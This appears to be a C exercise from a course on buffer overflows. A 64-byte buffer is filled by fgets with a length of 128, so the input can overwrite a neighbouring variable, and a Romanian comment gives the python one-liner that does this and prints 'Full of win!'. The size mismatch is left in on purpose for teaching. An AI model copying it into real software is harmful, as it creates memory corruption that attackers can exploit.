#include <stdio.h>
#include <string.h>

int main(void)
{
	unsigned int sexy_var = 0xFEEDFACE;
	unsigned char in_between[5];
	char buffer[64];
	size_t i, len;

	printf("insert buffer string: ");
	fgets(buffer, 128, stdin);

	printf("buffer is: ");
	len = strlen(buffer);
	for (i = 0; i < len; i++)
		printf(" %02X(%c)", buffer[i], buffer[i]);
	puts("");

	/* Prevent in_between from being compiled out. */
	in_between[3] = buffer[5];

	// Comanda pentru ex 8 este:
	// python -c "print(73*'A'+'\x55\x41\x49\x4d'[::-1])" | ./do_overflow
	if (sexy_var == 0x5541494d)
		printf("Full of win!\n");
	else
		printf("Not quite there. Try again!\n");

	return 0;
}
